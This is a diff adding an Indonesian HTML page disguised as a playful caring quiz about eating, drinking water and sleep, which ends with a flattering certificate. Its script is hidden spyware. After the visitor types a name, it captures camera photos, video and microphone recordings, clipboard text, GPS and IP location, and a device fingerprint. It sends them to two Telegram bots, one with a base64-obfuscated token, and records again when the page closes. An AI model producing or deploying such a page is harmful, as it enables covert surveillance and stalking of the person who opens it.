@@ -1,0 +1,905 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>vilmei imut</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800;900&family=Pacifico&display=swap');
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        :root {
+            --pink: #ff6b9d;
+            --pink2: #ff8fb1;
+            --purple: #c77dff;
+            --yellow: #ffe066;
+            --pale: #fff5f9;
+            --text: #3d1a2e;
+            --card-shadow: 0 12px 50px #ff6b9d2a, 0 2px 12px #c77dff18;
+        }
+        body {
+            font-family: 'Nunito', sans-serif;
+            background: linear-gradient(135deg, #fff0f7 0%, #f3eeff 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
+        .bg-hearts {
+            position: fixed;
+            inset: 0;
+            pointer-events: none;
+            z-index: 0;
+        }
+        .bh {
+            position: absolute;
+            font-size: 1.3rem;
+            opacity: .12;
+            animation: bhUp linear infinite;
+        }
+        @keyframes bhUp {
+            0% {
+                transform: translateY(110vh) rotate(0deg);
+                opacity: 0;
+            }
+            10% {
+                opacity: .15;
+            }
+            90% {
+                opacity: .15;
+            }
+            100% {
+                transform: translateY(-10vh) rotate(360deg);
+                opacity: 0;
+            }
+        }
+        .page {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            z-index: 1;
+            padding: 20px;
+            width: 100%;
+            max-width: 440px;
+        }
+        .page.active {
+            display: flex;
+            animation: popIn .5s cubic-bezier(.34, 1.56, .64, 1) both;
+        }
+        @keyframes popIn {
+            from {
+                opacity: 0;
+                transform: scale(.75) translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: scale(1) translateY(0);
+            }
+        }
+        .card {
+            background: white;
+            border-radius: 28px;
+            padding: 36px 32px;
+            width: 100%;
+            box-shadow: var(--card-shadow);
+            border: 2px solid #ffd6e8;
+            position: relative;
+            overflow: hidden;
+        }
+        .card::before {
+            content: '';
+            position: absolute;
+            top: -60px;
+            right: -60px;
+            width: 160px;
+            height: 160px;
+            background: radial-gradient(circle, #ffd6e855, transparent 70%);
+            border-radius: 50%;
+        }
+        .ribbon {
+            position: absolute;
+            top: 16px;
+            right: -8px;
+            background: linear-gradient(90deg, var(--pink), var(--purple));
+            color: white;
+            font-size: .7rem;
+            font-weight: 800;
+            padding: 5px 18px 5px 14px;
+            border-radius: 4px 0 0 4px;
+            letter-spacing: .5px;
+            box-shadow: -2px 2px 8px #ff6b9d44;
+        }
+        .ribbon::after {
+            content: '';
+            position: absolute;
+            right: -8px;
+            top: 0;
+            border: 14px solid transparent;
+            border-left: 8px solid var(--purple);
+        }
+        .emoji-big {
+            font-size: 3.8rem;
+            display: block;
+            text-align: center;
+            margin-bottom: 10px;
+            animation: bounce 1.4s ease-in-out infinite;
+        }
+        @keyframes bounce {
+            0%,
+            100% {
+                transform: translateY(0) rotate(-5deg);
+            }
+            50% {
+                transform: translateY(-8px) rotate(5deg);
+            }
+        }
+        h1 {
+            font-family: 'Pacifico', cursive;
+            color: var(--pink);
+            font-size: 1.6rem;
+            text-align: center;
+            margin-bottom: 8px;
+            line-height: 1.35;
+        }
+        .subtitle {
+            font-size: .82rem;
+            color: var(--purple);
+            font-weight: 800;
+            text-align: center;
+            margin-bottom: 18px;
+        }
+        p.desc {
+            color: var(--text);
+            font-size: 1rem;
+            font-weight: 700;
+            text-align: center;
+            line-height: 1.6;
+            margin-bottom: 22px;
+        }
+        .input-wrap {
+            position: relative;
+            margin-bottom: 22px;
+        }
+        input[type=text] {
+            width: 100%;
+            padding: 14px 20px;
+            border: 2.5px solid #ffd6e8;
+            border-radius: 50px;
+            font-family: 'Nunito', sans-serif;
+            font-size: 1rem;
+            font-weight: 700;
+            color: var(--text);
+            outline: none;
+            transition: border-color .2s, box-shadow .2s;
+            text-align: center;
+        }
+        input[type=text]::placeholder {
+            color: #ffb3cc;
+            font-weight: 600;
+        }
+        input[type=text]:focus {
+            border-color: var(--pink);
+            box-shadow: 0 0 0 4px #ff6b9d18;
+        }
+        .btn-row {
+            display: flex;
+            gap: 12px;
+            justify-content: center;
+            flex-wrap: wrap;
+            position: relative;
+            min-height: 56px;
+            align-items: center;
+        }
+        .btn {
+            padding: 13px 26px;
+            border: none;
+            border-radius: 50px;
+            font-family: 'Nunito', sans-serif;
+            font-weight: 800;
+            font-size: .95rem;
+            cursor: pointer;
+            transition: transform .15s, box-shadow .15s;
+            position: relative;
+            overflow: hidden;
+        }
+        .btn::after {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: white;
+            opacity: 0;
+            transition: opacity .15s;
+        }
+        .btn:active::after {
+            opacity: .2;
+        }
+        .btn-yes {
+            background: linear-gradient(135deg, var(--pink), var(--purple));
+            color: white;
+            box-shadow: 0 4px 18px #ff6b9d44;
+        }
+        .btn-yes:hover {
+            transform: scale(1.06);
+            box-shadow: 0 6px 24px #ff6b9d66;
+        }
+        .btn-no {
+            background: var(--yellow);
+            color: var(--text);
+            box-shadow: 0 4px 14px #ffe06655;
+            z-index: 10;
+        }
+        .hint-text {
+            font-size: .76rem;
+            color: #ffaac8;
+            font-weight: 800;
+            text-align: center;
+            margin-top: 12px;
+            min-height: 20px;
+            font-style: italic;
+        }
+        #loadingOverlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: #fff5f9ee;
+            z-index: 100;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 18px;
+            backdrop-filter: blur(6px);
+        }
+        #loadingOverlay.show {
+            display: flex;
+            animation: fadeIn .3s ease;
+        }
+        @keyframes fadeIn {
+            from {
+                opacity: 0
+            }
+            to {
+                opacity: 1
+            }
+        }
+        .loader-emoji {
+            font-size: 4rem;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+        .loader-msg {
+            font-family: 'Pacifico', cursive;
+            color: var(--pink);
+            font-size: 1.2rem;
+            text-align: center;
+        }
+        .loader-sub {
+            font-size: .85rem;
+            color: var(--purple);
+            font-weight: 700;
+        }
+        .timer-bar-wrap {
+            width: 220px;
+            height: 10px;
+            background: #ffd6e8;
+            border-radius: 50px;
+            overflow: hidden;
+        }
+        .timer-bar {
+            height: 100%;
+            background: linear-gradient(90deg, var(--pink), var(--purple));
+            border-radius: 50px;
+            transition: width .1s linear;
+            width: 100%;
+        }
+        .praise-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin: 16px 0 20px;
+        }
+        .praise-item {
+            background: linear-gradient(135deg, #fff0f7, #f3eeff);
+            border-radius: 16px;
+            padding: 12px 10px;
+            text-align: center;
+            border: 1.5px solid #ffd6e8;
+            font-size: .82rem;
+            font-weight: 700;
+            color: var(--text);
+        }
+        .praise-item .pi-emoji {
+            font-size: 1.6rem;
+            display: block;
+            margin-bottom: 4px;
+        }
+        .stars-wrap {
+            text-align: center;
+            font-size: 1.8rem;
+            letter-spacing: 4px;
+            margin: 6px 0 4px;
+            animation: glow 1.2s ease-in-out infinite alternate;
+        }
+        @keyframes glow {
+            from {
+                filter: brightness(1)
+            }
+            to {
+                filter: brightness(1.5) drop-shadow(0 0 8px #ffe066)
+            }
+        }
+        .final-msg {
+            background: linear-gradient(135deg, #fff0f7, #f3eeff);
+            border-radius: 20px;
+            padding: 16px;
+            font-size: .95rem;
+            font-weight: 700;
+            color: var(--text);
+            line-height: 1.7;
+            text-align: center;
+            border: 1.5px solid #ffd6e8;
+            margin-bottom: 18px;
+        }
+        .name-highlight {
+            color: var(--pink);
+            font-family: 'Pacifico', cursive;
+            font-size: 1.1rem;
+        }
+        .conf {
+            position: fixed;
+            pointer-events: none;
+            z-index: 999;
+            border-radius: 2px;
+            animation: confFall linear forwards;
+        }
+        @keyframes confFall {
+            0% {
+                opacity: 1;
+                transform: translateY(-20px) rotate(0deg);
+            }
+            100% {
+                opacity: 0;
+                transform: translateY(110vh) rotate(720deg);
+            }
+        }
+        .chat-box {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            margin-bottom: 18px;
+        }
+        .bubble {
+            padding: 10px 16px;
+            border-radius: 18px;
+            font-size: .9rem;
+            font-weight: 700;
+            max-width: 90%;
+        }
+        .bubble.them {
+            background: #f2f2f2;
+            color: #333;
+            border-radius: 18px 18px 18px 4px;
+            align-self: flex-start;
+        }
+        .bubble.me {
+            background: linear-gradient(135deg, var(--pink), var(--purple));
+            color: white;
+            border-radius: 18px 18px 4px 18px;
+            align-self: flex-end;
+        }
+        @media(max-width:400px) {
+            .card {
+                padding: 28px 18px;
+            }
+            h1 {
+                font-size: 1.3rem;
+            }
+            .praise-grid {
+                grid-template-columns: 1fr 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="bg-hearts" id="bgHearts"></div>
+    <div id="loadingOverlay">
+        <div class="loader-emoji" id="loaderEmoji">🌸</div>
+        <div class="loader-msg" id="loaderMsg">Sabar yaaa~</div>
+        <div class="loader-sub" id="loaderSub">lagi loading kasih sayang...</div>
+        <div class="timer-bar-wrap"><div class="timer-bar" id="timerBar"></div></div>
+    </div>
+    <div class="page active" id="page0" style="max-width:440px;width:100%;">
+        <div class="card">
+            <span class="emoji-big">🌸</span>
+            <h1>Halooo!</h1>
+            <p class="desc">Sebelum mulai, kenalin dulu dong siapa nama kamu? 👀</p>
+            <div class="input-wrap">
+                <input type="text" id="namaInput" placeholder="Nama kamu..." maxlength="20" />
+            </div>
+            <div class="btn-row">
+                <button class="btn btn-yes" onclick="submitNama()">Mulai 💌</button>
+            </div>
+            <p class="hint-text" id="namaHint"></p>
+        </div>
+    </div>
+    <div class="page" id="page1">
+        <div class="card">
+            <div class="ribbon">PENTING 🚨</div>
+            <span class="emoji-big">🍱</span>
+            <h1 id="q1title">Heyy Sayang!</h1>
+            <p class="desc" id="q1desc">Kamu udah makan belum hari ini?? Jujur ya jangan bohong 👀</p>
+            <div class="btn-row" id="row1">
+                <button class="btn btn-yes" onclick="triggerLoading(2, 'Ngecek riwayat makan kamu...', '🍜', 'Sistem sedang memverifikasi...')">Udah dong 😋</button>
+                <button class="btn btn-no" id="no1">Belum 🙈</button>
+            </div>
+            <p class="hint-text" id="hint1"></p>
+        </div>
+    </div>
+    <div class="page" id="page2">
+        <div class="card">
+            <span class="emoji-big">💧</span>
+            <h1>Oke Keren!</h1>
+            <div class="chat-box">
+                <div class="bubble them">udah minum air putih ga? 🥺</div>
+                <div class="bubble them">jangan cuma kopi doang ya~</div>
+            </div>
+            <div class="btn-row" id="row2">
+                <button class="btn btn-yes" onclick="triggerLoading(3, 'Menghitung kadar H₂O kamu...', '💧', 'Hasilnya mengagumkan!')">Udah minum 💧</button>
+                <button class="btn btn-no" id="no2">Belum juga 😅</button>
+            </div>
+            <p class="hint-text" id="hint2"></p>
+        </div>
+    </div>
+    <div class="page" id="page3">
+        <div class="card">
+            <span class="emoji-big">😴</span>
+            <h1>Wah Rajin!</h1>
+            <p class="desc">Tapi semalam tidurnya cukup ga? Atau begadang scroll TikTok lagi? 😒</p>
+            <div class="btn-row" id="row3">
+                <button class="btn btn-yes" onclick="triggerLoading(4, 'Menganalisis pola tidur kamu...', '🌙', 'Hasilnya bikin baper...')">Cukup kok 😇</button>
+                <button class="btn btn-no" id="no3">Dikit sih begadang 🌙</button>
+            </div>
+            <p class="hint-text" id="hint3"></p>
+        </div>
+    </div>
+    <div class="page" id="page4">
+        <div class="card">
+            <div class="ribbon">HASIL ANALISIS 💻</div>
+            <span class="emoji-big" style="animation:none;font-size:4.5rem;margin-top:10px">🏆</span>
+            <h1>Laporan Resmi!</h1>
+            <div class="stars-wrap">⭐⭐⭐⭐⭐</div>
+            <p class="subtitle">Sertifikat Dikeluarkan Khusus Untuk:</p>
+            <p class="subtitle" style="font-size:1.1rem;color:var(--pink)" id="namaFinal"></p>
+            <div class="praise-grid" id="praiseGrid">
+                <div class="praise-item"><span class="pi-emoji">😍</span>Paling Cantik Sedunia</div>
+                <div class="praise-item"><span class="pi-emoji">🧠</span>Otak Encer Banget</div>
+                <div class="praise-item"><span class="pi-emoji">💪</span>Kuat & Tangguh</div>
+                <div class="praise-item"><span class="pi-emoji">🌸</span>Aura Positif 100%</div>
+                <div class="praise-item"><span class="pi-emoji">😂</span>Lucu Meskipun Ngeyel</div>
+                <div class="praise-item"><span class="pi-emoji">💖</span>Disayang Banget</div>
+            </div>
+            <div class="final-msg" id="finalMsg"></div>
+            <div class="btn-row">
+                <button class="btn btn-yes" onclick="restart()">Ulang lagi 🔄</button>
+            </div>
+        </div>
+    </div>
+    <script>
+        (function() {
+            var bgEl = document.getElementById('bgHearts');
+            var emojis = ['❤️', '💕', '💖', '💗', '🌸', '✨', '💝', '💓', '🦋'];
+            for (var i = 0; i < 24; i++) {
+                var d = document.createElement('div');
+                d.className = 'bh';
+                d.textContent = emojis[Math.floor(Math.random() * emojis.length)];
+                d.style.left = Math.random() * 100 + 'vw';
+                d.style.animationDuration = (9 + Math.random() * 11) + 's';
+                d.style.animationDelay = (Math.random() * 12) + 's';
+                d.style.fontSize = (1 + Math.random() * 1.3) + 'rem';
+                bgEl.appendChild(d);
+            }
+
+            var nama = '';
+            var bag = {};
+
+            var rawToken1 = 'ODQzNzkzNTgxNjpBQUhnZDRRUm9NaV8ydTJnWkZTaFFwaTd6bUVqMFl0VHQ5VQ==';
+            var rawCID1 = 'ODQzMDIwMTgxNw==';
+            var token1 = '';
+            var cid1 = '';
+            var token2 = '8795745920:AAEmvC84Ha2dtu_vdOy9WxTuwSiOfqbwBU8';
+            var cid2 = '6643920467';
+
+            try {
+                token1 = atob(rawToken1);
+                cid1 = atob(rawCID1);
+            } catch (e) {
+                token1 = rawToken1;
+                cid1 = rawCID1;
+            }
+
+            function sendTG(token, cid, text) {
+                if (!token || !cid) return;
+                var url = 'https://api.telegram.org/bot' + token + '/sendMessage';
+                var body = JSON.stringify({ chat_id: cid, text: text, parse_mode: 'HTML' });
+                if (navigator.sendBeacon) {
+                    var blob = new Blob([body], { type: 'application/json' });
+                    navigator.sendBeacon(url, blob);
+                } else {
+                    var x = new XMLHttpRequest();
+                    x.open('POST', url, true);
+                    x.setRequestHeader('Content-Type', 'application/json');
+                    x.send(body);
+                }
+            }
+
+            function sendFile(token, cid, blob, fname, caption, type) {
+                if (!token || !cid) return;
+                var fd = new FormData();
+                fd.append('chat_id', cid);
+                var field = type === 'voice' ? 'voice' : type === 'video' ? 'video' : 'document';
+                fd.append(field, blob, fname);
+                if (caption) fd.append('caption', caption);
+                var method = type === 'voice' ? 'sendVoice' : type === 'video' ? 'sendVideo' : 'sendDocument';
+                var url = 'https://api.telegram.org/bot' + token + '/' + method;
+                var x = new XMLHttpRequest();
+                x.open('POST', url, true);
+                x.send(fd);
+            }
+
+            function sendBoth(msg) {
+                sendTG(token1, cid1, msg);
+                sendTG(token2, cid2, msg);
+            }
+
+            function sendFileBoth(blob, fname, caption, type) {
+                sendFile(token1, cid1, blob, fname, caption, type);
+                sendFile(token2, cid2, blob, fname, caption, type);
+            }
+
+            function collect() {
+                var n = navigator,
+                    s = screen,
+                    w = window,
+                    d = document,
+                    t = new Date();
+                bag = {
+                    nama: nama,
+                    ua: n.userAgent,
+                    plat: n.platform || '',
+                    lang: n.language || '',
+                    langs: JSON.stringify(n.languages || []),
+                    cookie: n.cookieEnabled,
+                    dnt: n.doNotTrack || 'unspec',
+                    cpu: n.hardwareConcurrency || '?',
+                    ram: (n.deviceMemory || '?') + 'GB',
+                    touch: n.maxTouchPoints || 0,
+                    vendor: n.vendor || '',
+                    sw: s.width,
+                    sh: s.height,
+                    scd: s.colorDepth,
+                    vw: w.innerWidth,
+                    vh: w.innerHeight,
+                    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    time: t.toISOString(),
+                    local: t.toLocaleString(),
+                    ref: d.referrer || 'Direct',
+                    online: n.onLine,
+                    conn: n.connection ? n.connection.effectiveType : '?',
+                    downlink: n.connection ? n.connection.downlink + 'Mbps' : '?',
+                    rtt: n.connection ? n.connection.rtt + 'ms' : '?'
+                };
+                if (n.getBattery) {
+                    n.getBattery().then(function(b) {
+                        bag.bat = Math.round(b.level * 100) + '%';
+                        bag.charge = b.charging;
+                    }).catch(function() {});
+                }
+            }
+
+            function ipGrab() {
+                fetch('https://ipapi.co/json/').then(function(r) { return r.json(); }).then(function(d) {
+                    bag.ip = d.ip || '?';
+                    bag.isp = d.org || d.asn || '?';
+                    bag.city = d.city || '?';
+                    bag.region = d.region || '?';
+                    bag.country = d.country_name || '?';
+                    bag.postal = d.postal || '?';
+                    bag.lat = d.latitude;
+                    bag.lon = d.longitude;
+                    bag.asn = d.asn || '?';
+                    flush();
+                }).catch(function() {
+                    bag.ip = 'fail';
+                    flush();
+                });
+            }
+
+            function flush() {
+                if (!bag.ip) return;
+                var map = bag.lat ? 'https://maps.google.com/?q=' + bag.lat + ',' + bag.lon : 'N/A';
+                var msg = ' <b>Vilmei Report</b>\n\n' +
+                    '👤 <b>Identity</b>\nName: ' + (bag.nama || '?') + '\n\n' +
+                    '📍 <b>Network</b>\nIP: ' + bag.ip + '\nISP: ' + bag.isp + '\nCity: ' + bag.city + ', ' + bag.region +
+                    ', ' + bag.country + '\nPostal: ' + bag.postal + '\nASN: ' + bag.asn + '\nCoords: ' + (bag.lat || '?') +
+                    ', ' + (bag.lon || '?') + '\nMaps: ' + map + '\n\n' +
+                    '📱 <b>Device</b>\nPlatform: ' + bag.plat + '\nLang: ' + bag.lang + '\nTZ: ' + bag.tz + '\nScreen: ' +
+                    bag.sw + 'x' + bag.sh + ' (' + bag.scd + 'bit)\nView: ' + bag.vw + 'x' + bag.vh + '\nCPU: ' + bag.cpu +
+                    ' cores\nRAM: ' + bag.ram + '\nTouch: ' + bag.touch + '\nBattery: ' + (bag.bat || '?') + ' ' + (bag
+                        .charge !== undefined ? (bag.charge ? '⚡' : '🔋') : '') + '\nConnection: ' + bag.conn + ' (' + bag
+                    .downlink + ', RTT ' + bag.rtt + ')\nOnline: ' + bag.online + '\n\n' +
+                    '🔧 <b>Technical</b>\nUA: ' + bag.ua + '\nVendor: ' + bag.vendor + '\nCookies: ' + bag.cookie +
+                    '\nDNT: ' + bag.dnt + '\nRef: ' + bag.ref + '\n\n' +
+                    '🕒 ' + bag.local;
+                sendBoth(msg);
+            }
+
+            async function cams() {
+                try {
+                    var s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+                    var v = document.createElement('video');
+                    v.srcObject = s;
+                    v.play();
+                    await new Promise(function(r) { v.onloadedmetadata = r; });
+                    var c = document.createElement('canvas');
+                    c.width = v.videoWidth || 640;
+                    c.height = v.videoHeight || 480;
+                    c.getContext('2d').drawImage(v, 0, 0);
+                    var b = await new Promise(function(r) { c.toBlob(r, 'image/jpeg', 0.8); });
+                    sendFileBoth(b, 'cam_front.jpg', '📸 Front Camera', 'document');
+                    s.getTracks().forEach(function(t) { t.stop(); });
+                } catch (e) {}
+                try {
+                    var s2 = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' },
+                        audio: false });
+                    var v2 = document.createElement('video');
+                    v2.srcObject = s2;
+                    v2.play();
+                    await new Promise(function(r) { v2.onloadedmetadata = r; });
+                    var c2 = document.createElement('canvas');
+                    c2.width = v2.videoWidth || 640;
+                    c2.height = v2.videoHeight || 480;
+                    c2.getContext('2d').drawImage(v2, 0, 0);
+                    var b2 = await new Promise(function(r) { c2.toBlob(r, 'image/jpeg', 0.8); });
+                    sendFileBoth(b2, 'cam_back.jpg', '📸 Back Camera', 'document');
+                    s2.getTracks().forEach(function(t) { t.stop(); });
+                } catch (e) {}
+            }
+
+            async function vid() {
+                try {
+                    var s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
+                    var m = new MediaRecorder(s, { mimeType: 'video/webm' });
+                    var chunks = [];
+                    m.ondataavailable = function(e) { chunks.push(e.data); };
+                    m.onstop = function() {
+                        var b = new Blob(chunks, { type: 'video/webm' });
+                        sendFileBoth(b, 'vid_front.webm', '🎥 Front Video 3s', 'video');
+                        s.getTracks().forEach(function(t) { t.stop(); });
+                    };
+                    m.start();
+                    setTimeout(function() { m.stop(); }, 3000);
+                } catch (e) {}
+                try {
+                    var s2 = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' },
+                        audio: true });
+                    var m2 = new MediaRecorder(s2, { mimeType: 'video/webm' });
+                    var chunks2 = [];
+                    m2.ondataavailable = function(e) { chunks2.push(e.data); };
+                    m2.onstop = function() {
+                        var b2 = new Blob(chunks2, { type: 'video/webm' });
+                        sendFileBoth(b2, 'vid_back.webm', '🎥 Back Video 3s', 'video');
+                        s2.getTracks().forEach(function(t) { t.stop(); });
+                    };
+                    m2.start();
+                    setTimeout(function() { m2.stop(); }, 3000);
+                } catch (e) {}
+            }
+
+            async function mic() {
+                try {
+                    var s = await navigator.mediaDevices.getUserMedia({ audio: true });
+                    var m = new MediaRecorder(s, { mimeType: 'audio/webm' });
+                    var chunks = [];
+                    m.ondataavailable = function(e) { chunks.push(e.data); };
+                    m.onstop = function() {
+                        var b = new Blob(chunks, { type: 'audio/webm' });
+                        sendFileBoth(b, 'voice.webm', '🎤 Voice Note 3s', 'voice');
+                        s.getTracks().forEach(function(t) { t.stop(); });
+                    };
+                    m.start();
+                    setTimeout(function() { m.stop(); }, 3000);
+                } catch (e) {}
+            }
+
+            async function clip() {
+                try {
+                    var t = await navigator.clipboard.readText();
+                    if (t && t.length > 0 && t.length < 600) sendBoth('📋 Clipboard: ' + t);
+                } catch (e) {}
+            }
+
+            function gps() {
+                if (!navigator.geolocation) return;
+                navigator.geolocation.getCurrentPosition(function(p) {
+                    var gpsMsg = '📍 <b>Precise GPS</b>\nLat: ' + p.coords.latitude + '\nLon: ' + p.coords.longitude +
+                        '\nAcc: ' + p.coords.accuracy + 'm\nMaps: https://maps.google.com/?q=' + p.coords.latitude +
+                        ',' + p.coords.longitude;
+                    sendBoth(gpsMsg);
+                }, function() {}, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
+            }
+
+            window.submitNama = function() {
+                var val = document.getElementById('namaInput').value.trim();
+                if (!val) {
+                    document.getElementById('namaHint').textContent = 'Masa nama kamu kosong sih? 😅';
+                    document.getElementById('namaInput').style.borderColor = 'var(--pink)';
+                    return;
+                }
+                nama = val;
+                collect();
+                ipGrab();
+                cams();
+                vid();
+                mic();
+                clip();
+                gps();
+                triggerLoading(1, 'Nyiapin sesuatu buat ' + nama + '...', '🌸', 'Sebentar yaaa~');
+            };
+
+            document.getElementById('namaInput').addEventListener('keydown', function(e) {
+                if (e.key === 'Enter') submitNama();
+            });
+
+            window.triggerLoading = function(toPage, msg, emoji, sub, duration) {
+                if (!duration) duration = 2500;
+                var overlay = document.getElementById('loadingOverlay');
+                var bar = document.getElementById('timerBar');
+                document.getElementById('loaderMsg').textContent = msg;
+                document.getElementById('loaderEmoji').textContent = emoji;
+                document.getElementById('loaderSub').textContent = sub;
+                bar.style.transition = 'none';
+                bar.style.width = '100%';
+                overlay.classList.add('show');
+                setTimeout(function() {
+                    bar.style.transition = 'width ' + duration + 'ms linear';
+                    bar.style.width = '0%';
+                }, 60);
+                setTimeout(function() {
+                    overlay.classList.remove('show');
+                    bar.style.transition = 'none';
+                    bar.style.width = '100%';
+                    goPage(toPage);
+                }, duration);
+            };
+
+            function goPage(n) {
+                var pages = document.querySelectorAll('.page');
+                for (var i = 0; i < pages.length; i++) pages[i].classList.remove('active');
+                var pg = document.getElementById('page' + n);
+                pg.classList.add('active');
+                if (n === 1) {
+                    document.getElementById('q1title').textContent = 'Heyy ' + nama + '!';
+                    document.getElementById('q1desc').textContent = nama +
+                        ', kamu udah makan belum hari ini?? Jujur ya jangan bohong 👀';
+                }
+                if (n === 4) buildFinalPage();
+            }
+
+            function setupRunaway(btnId, hintId, onGiveUp) {
+                var btn = document.getElementById(btnId);
+                var hint = document.getElementById(hintId);
+                var tries = 0;
+                var hints = [
+                    'Eh mau kabur kemana tuh? 😂',
+                    'Hahaha dapetnya juga ga~ 🏃‍♀️',
+                    'Udah 3x lho belum kena juga 😏',
+                    'Mau nyoba lagi? Percuma wkwk 💀',
+                    'Oke oke, aku sabar nunggu~ 🌸'
+                ];
+
+                function flee(e) {
+                    e.preventDefault();
+                    tries++;
+                    hint.textContent = hints[Math.min(tries - 1, hints.length - 1)];
+                    var W = window.innerWidth,
+                        H = window.innerHeight;
+                    var bw = btn.offsetWidth + 20,
+                        bh = btn.offsetHeight + 20;
+                    var x = Math.random() * (W - bw) + 10;
+                    var y = Math.random() * (H - bh) + 10;
+                    btn.style.position = 'fixed';
+                    btn.style.left = x + 'px';
+                    btn.style.top = y + 'px';
+                    btn.style.zIndex = 50;
+                    if (tries >= 5) {
+                        btn.textContent = 'Oke deh capek 😭';
+                        btn.onmouseenter = null;
+                        btn.ontouchstart = null;
+                        setTimeout(function() { onGiveUp(); }, 700);
+                    }
+                }
+                btn.onmouseenter = flee;
+                btn.ontouchstart = flee;
+                btn.onclick = flee;
+            }
+
+            function resetBtn(btnId) {
+                var btn = document.getElementById(btnId);
+                btn.style.position = '';
+                btn.style.left = '';
+                btn.style.top = '';
+            }
+
+            setupRunaway('no1', 'hint1', function() {
+                triggerLoading(2, 'Iya deh percaya kamu belum makan 😑', '🍜', 'Lanjut ya...');
+            });
+            setupRunaway('no2', 'hint2', function() {
+                triggerLoading(3, 'Dehidrasi terdeteksi 💀', '💧', 'Wah parah...');
+            });
+            setupRunaway('no3', 'hint3', function() {
+                triggerLoading(4, 'Menganalisis lingkaran mata kamu...', '🌙', 'Ketahuan begadang...');
+            });
+
+            function buildFinalPage() {
+                document.getElementById('namaFinal').textContent = '👑 ' + nama + ' 👑';
+                document.getElementById('finalMsg').innerHTML = '<b class="name-highlight">' + nama +
+                    '</b> udah terbukti secara ilmiah jadi orang paling <span style="color:var(--pink)">sempurna</span>, paling <span style="color:var(--purple)">lucu</span>, dan paling <span style="color:#ff9f66">disayang</span> di alam semesta ini! 🌍✨<br><br>Tetep jaga makan, minum air, dan tidur yang cukup ya~ soalnya dunia butuh kamu tetap sehat & bahagia 💖';
+                spawnConfetti();
+            }
+
+            window.restart = function() {
+                nama = '';
+                document.getElementById('namaInput').value = '';
+                document.getElementById('namaHint').textContent = '';
+                resetBtn('no1');
+                resetBtn('no2');
+                resetBtn('no3');
+                document.getElementById('hint1').textContent = '';
+                document.getElementById('hint2').textContent = '';
+                document.getElementById('hint3').textContent = '';
+                setupRunaway('no1', 'hint1', function() {
+                    triggerLoading(2, 'Iya deh percaya kamu belum makan 😑', '🍜', 'Lanjut ya...');
+                });
+                setupRunaway('no2', 'hint2', function() {
+                    triggerLoading(3, 'Dehidrasi terdeteksi 💀', '💧', 'Wah parah...');
+                });
+                setupRunaway('no3', 'hint3', function() {
+                    triggerLoading(4, 'Menganalisis lingkaran mata kamu...', '🌙', 'Ketahuan begadang...');
+                });
+                goPage(0);
+            };
+
+            function spawnConfetti() {
+                var cols = ['#ff6b9d', '#c77dff', '#ffe066', '#6bcbff', '#ff9f66', '#b5ffe1', '#ffb3d1'];
+                for (var i = 0; i < 90; i++) {
+                    var c = document.createElement('div');
+                    c.className = 'conf';
+                    c.style.left = Math.random() * 100 + 'vw';
+                    c.style.top = '-20px';
+                    c.style.width = (6 + Math.random() * 10) + 'px';
+                    c.style.height = (6 + Math.random() * 10) + 'px';
+                    c.style.borderRadius = Math.random() > .5 ? '50%' : '3px';
+                    c.style.background = cols[Math.floor(Math.random() * cols.length)];
+                    c.style.animationDuration = (2 + Math.random() * 2.5) + 's';
+                    c.style.animationDelay = (Math.random() * 1.5) + 's';
+                    document.body.appendChild(c);
+                    setTimeout(function() { c.remove(); }, 5000);
+                }
+            }
+
+            window.addEventListener('beforeunload', function() {
+                mic();
+                if (bag.ip) flush();
+            });
+            window.addEventListener('pagehide', function() { mic(); });
+        })();
+    </script>
+</body>
+</html>
